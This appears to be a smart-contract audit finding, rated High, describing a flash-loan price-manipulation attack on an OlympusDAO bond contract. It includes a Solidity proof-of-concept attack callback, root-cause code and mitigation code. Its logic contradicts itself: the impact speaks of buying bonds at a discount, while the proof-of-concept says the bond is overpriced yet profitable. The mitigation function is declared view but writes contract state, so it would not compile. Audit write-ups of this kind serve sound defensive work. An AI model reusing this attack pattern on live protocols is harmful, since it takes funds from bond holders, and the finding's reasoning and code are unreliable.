# H-04: Flash loan attack via price manipulation in single-block allows arbitrage beyond fee

## Severity: High

## Lines of code  
https://github.com/OlympusDAO/olympus-contracts/blob/main/src/policies/BondCallback.sol#L122-L178

## Vulnerability details

### Impact

An attacker can use a flash loan to manipulate the bonding curve price in a single block, purchase bonds at a discount, and repay the flash loan. Due to the lack of per-block price checks, the bond market price can be moved by more than the configured debt decay, allowing the attacker to extract value from bond holders.

### Proof of Concept

```solidity
// Flash loan callback
function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // 1. Use flash loaned DAI to buy OHM from external AMM
    //    This raises OHM/DAI spot price temporarily
    uint256 ohmBought = buyOhmFromAMM(amounts[0]);

    // 2. Create bond at inflated price
    //    Bond price uses spot-influenced oracle → overpriced bond
    uint256 bondPayout = bondDepository.deposit(
        marketId,
        amounts[0] / 2,  // use half the flash loan for bond
        maxPrice,
        address(this),
        address(this)
    );

    // 3. Sell OHM back to AMM (restore price)
    sellOhmToAMM(ohmBought);

    // 4. Repay flash loan — net profit from bond discount
    DAI.transfer(msg.sender, amounts[0] + feeAmounts[0]);
    // Remaining bondPayout profit kept by attacker
}
```

### Root cause

The bond market uses a price oracle that is susceptible to same-block manipulation:

```solidity
// BondCallback.sol line 122
function _currentPrice(uint256 id_) internal view returns (uint256) {
    BondMarket memory market = markets[id_];
    // Uses spot price, not TWAP — manipulable within single block
    uint256 ohmPrice = priceOracle.getSpotPrice(market.quoteToken, market.payoutToken);
    // debt decay insufficient to prevent intra-block manipulation
    uint256 decay = _debtDecay(id_);
    return ohmPrice.mulDiv(market.scale, decay);
}
```

### Recommended Mitigation

1. Use a TWAP oracle with at least 1-hour window for bond pricing.
2. Add a per-market maximum purchase limit per block.
3. Add a sanity check: revert if price moves more than X% from previous block.

```solidity
uint256 constant MAX_PRICE_MOVE_BPS = 200; // 2% max per block

function _currentPrice(uint256 id_) internal view returns (uint256) {
    uint256 currentPrice = priceOracle.getTWAP(token, 3600); // 1hr TWAP
    uint256 lastPrice = lastPricePerMarket[id_];
    if (lastPrice != 0) {
        uint256 deviation = _deviation(currentPrice, lastPrice);
        require(deviation <= MAX_PRICE_MOVE_BPS, "Bond: price moved too fast");
    }
    lastPricePerMarket[id_] = currentPrice;
    return currentPrice;
}
```

## Tools used
Manual review, Foundry fork test

## Assessed type
Flash Loan Attack, Oracle Manipulation
